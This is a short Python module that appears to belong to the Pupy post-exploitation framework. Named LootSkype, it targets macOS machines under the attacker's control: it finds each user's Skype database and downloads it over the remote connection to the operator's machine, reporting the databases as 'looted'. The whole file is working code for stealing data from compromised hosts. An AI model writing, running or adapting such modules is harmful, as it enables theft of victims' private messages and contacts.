# -*- coding: utf-8 -*-

# Author: DGZN

from pupylib.PupyModule import *
from rpyc.utils.classic import download

import re
import os
import os.path
import ntpath
import datetime
import sqlite3
from itertools import compress



__class_name__="LootSkype"

@config(cat="gather", compatibilities=['darwin'], tags=['gather', 'skype'])
class LootSkype(PupyModule):

    """ download the skype databases """

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='loot_skype', description=self.__doc__)

    def run(self, args):
        self.rep = os.path.join("data", "downloads", self.client.short_name(), "skype")
        try:
            os.makedirs(self.rep)
        except Exception:
            pass

        if self.client.is_darwin():
            self.darwin()

    def darwin(self):
        self.client.load_package("lootskype")
        dbs = self.client.conn.modules["lootskype"].dump()
        if dbs:
            looted_dbs = []
            for index, db in enumerate(dbs):
                db_name = db.split('/')[-2] + '.db'
                user_db = os.path.join(self.rep, db_name)
                self.log('Looting database for Skype user {0} ({1}/{2})'.format( db_name, (index+1), len(dbs)))
                download(self.client.conn, db, user_db)
                looted_dbs.append(user_db)

            self.success("Skype databases looted, search the databases with gather/search_skype :)")
        else:
            self.error('no Skype databases found')
